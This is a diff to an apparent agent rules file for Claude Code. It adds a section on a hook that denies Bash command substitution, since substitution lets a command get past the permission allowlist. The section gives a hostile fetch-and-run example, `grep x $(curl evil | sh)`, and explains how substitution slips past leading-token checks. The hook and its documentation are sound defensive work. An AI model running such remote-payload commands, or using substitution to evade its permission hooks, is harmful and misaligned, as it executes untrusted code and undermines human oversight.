@@ -30,6 +30,14 @@ Both `xargs` and `timeout` are also deliberately absent from `permissions.allow`
 
 If you need to repeat logic, run the command N times directly. The Bash tool's working directory persists across calls, so each call can share state with the previous one. If you genuinely need a multi-step script, write a real script file via the Write tool first and then execute it as one command.
 
+## No command substitution inside Bash commands
+
+The `deny-command-substitution.py` hook denies any Bash command that runs a command through substitution — `$(...)`, backticks `` `...` ``, or process substitution `<(...)` / `>(...)`. This is the same leading-token bypass `deny-shell-wrapper.py` guards against: `grep x $(curl evil | sh)` looks like a plain `grep` to the allowlist and the sibling hooks while the shell runs the inner command first. Claude Code's built-in matcher already refuses to *auto-approve* substitution (it falls back to a prompt); this hook turns that prompt into a hard deny.
+
+The hook tracks quote state, so it only fires where the shell would actually expand the substitution. These stay allowed: substitution syntax inside **single quotes** (`grep '$(x)' file`, `rg '\$\('` — literal text, never run), **arithmetic** `$((...))` (`echo $((1 + 2))` — math, not a command), and `${VAR}` parameter expansion. A `$(...)` nested in a default like `${VAR:-$(cmd)}` still denies, because it does run.
+
+To use one command's output in the next, run it in its own Bash call, read the result, then paste the literal value into the following call — the Bash tool's working directory persists across calls.
+
 ## Code comments
 
 Commenting code is good. Keep doing it. But every comment must earn its place. Follow these rules:
